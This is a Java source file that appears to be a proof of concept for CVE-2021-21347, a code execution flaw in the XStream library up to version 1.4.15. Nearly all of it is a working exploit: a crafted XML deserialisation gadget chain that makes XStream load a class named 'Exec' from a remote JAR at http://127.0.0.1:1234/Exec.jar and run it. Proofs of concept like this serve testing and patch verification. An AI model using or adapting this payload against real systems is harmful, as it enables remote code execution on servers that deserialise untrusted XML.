package org.example;

import com.thoughtworks.xstream.XStream;

/**
 * Code Execution ClassLoader <=1.4.15
 */
public class CVE_2021_21347 {
    public static void main(String[] args) throws IllegalAccessException, InstantiationException {
        String xml = "<java.util.PriorityQueue serialization='custom'>\n" +
                "  <unserializable-parents/>\n" +
                "  <java.util.PriorityQueue>\n" +
                "    <default>\n" +
                "      <size>2</size>\n" +
                "      <comparator class='javafx.collections.ObservableList$1'/>\n" +
                "    </default>\n" +
                "    <int>3</int>\n" +
                "    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>\n" +
                "      <dataHandler>\n" +
                "        <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>\n" +
                "          <contentType>text/plain</contentType>\n" +
                "          <is class='java.io.SequenceInputStream'>\n" +
                "            <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>\n" +
                "              <iterator class='com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator'>\n" +
                "                <names class='java.util.AbstractList$Itr'>\n" +
                "                  <cursor>0</cursor>\n" +
                "                  <lastRet>-1</lastRet>\n" +
                "                  <expectedModCount>0</expectedModCount>\n" +
                "                  <outer-class class='java.util.Arrays$ArrayList'>\n" +
                "                    <a class='string-array'>\n" +
                "                      <string>Exec</string>\n" +
                "                    </a>\n" +
                "                  </outer-class>\n" +
                "                </names>\n" +
                "                <processorCL class='java.net.URLClassLoader'>\n" +
                "                  <ucp class='sun.misc.URLClassPath'>\n" +
                "                    <urls serialization='custom'>\n" +
                "                      <unserializable-parents/>\n" +
                "                      <vector>\n" +
                "                        <default>\n" +
                "                          <capacityIncrement>0</capacityIncrement>\n" +
                "                          <elementCount>1</elementCount>\n" +
                "                          <elementData>\n" +
                "                            <url>http://127.0.0.1:1234/Exec.jar</url>\n" +
                "                          </elementData>\n" +
                "                        </default>\n" +
                "                      </vector>\n" +
                "                    </urls>\n" +
                "                    <path>\n" +
                "                      <url>http://127.0.0.1:1234/Exec.jar</url>\n" +
                "                    </path>\n" +
                "                    <loaders/>\n" +
                "                    <lmap/>\n" +
                "                  </ucp>\n" +
                "                  <package2certs class='concurrent-hash-map'/>\n" +
                "                  <classes/>\n" +
                "                  <defaultDomain>\n" +
                "                    <classloader class='java.net.URLClassLoader' reference='../..'/>\n" +
                "                    <principals/>\n" +
                "                    <hasAllPerm>false</hasAllPerm>\n" +
                "                    <staticPermissions>false</staticPermissions>\n" +
                "                    <key>\n" +
                "                      <outer-class reference='../..'/>\n" +
                "                    </key>\n" +
                "                  </defaultDomain>\n" +
                "                  <initialized>true</initialized>\n" +
                "                  <pdcache/>\n" +
                "                </processorCL>\n" +
                "              </iterator>\n" +
                "              <type>KEYS</type>\n" +
                "            </e>\n" +
                "            <in class='java.io.ByteArrayInputStream'>\n" +
                "              <buf></buf>\n" +
                "              <pos>-2147483648</pos>\n" +
                "              <mark>0</mark>\n" +
                "              <count>0</count>\n" +
                "            </in>\n" +
                "          </is>\n" +
                "          <consumed>false</consumed>\n" +
                "        </dataSource>\n" +
                "        <transferFlavors/>\n" +
                "      </dataHandler>\n" +
                "      <dataLen>0</dataLen>\n" +
                "    </com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>\n" +
                "    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference='../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'/>\n" +
                "  </java.util.PriorityQueue>\n" +
                "</java.util.PriorityQueue>";

        XStream xstream = new XStream();
        xstream.fromXML(xml);
    }

}
